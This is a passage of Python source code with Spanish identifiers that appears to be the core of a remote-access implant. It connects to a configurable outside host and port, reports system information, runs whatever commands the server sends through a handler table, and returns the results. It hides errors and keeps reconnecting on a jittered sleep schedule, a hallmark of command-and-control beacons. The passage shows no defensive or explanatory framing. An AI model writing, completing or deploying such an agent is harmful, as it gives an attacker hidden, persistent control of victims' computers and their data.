        fn = HANDLERS.get(cmd)
        try:
            datos = fn(msg.get("args", {}) or {}) if fn else {"error": "cmd desconocido"}
            _enviar(sock, {"tipo": "respuesta", "cmd": cmd, "ok": True, "datos": datos})
        except Exception as e:
            _enviar(sock, {"tipo": "respuesta", "cmd": cmd, "ok": False, "error": str(e)})
        if _SALIR:
            os._exit(0)


def main():
    if len(sys.argv) >= 3:
        globals()["HOST"] = sys.argv[1]
        globals()["PORT"] = int(sys.argv[2])
    while True:
        try:
            s = socket.socket()
            s.connect((HOST, PORT))
            _enviar(s, {"tipo": "hola", "info": _sysinfo()})
            _bucle(s)
        except Exception:
            pass
        time.sleep(SLEEP * (1 + random.uniform(-JITTER, JITTER)))


if __name__ == "__main__":
    main()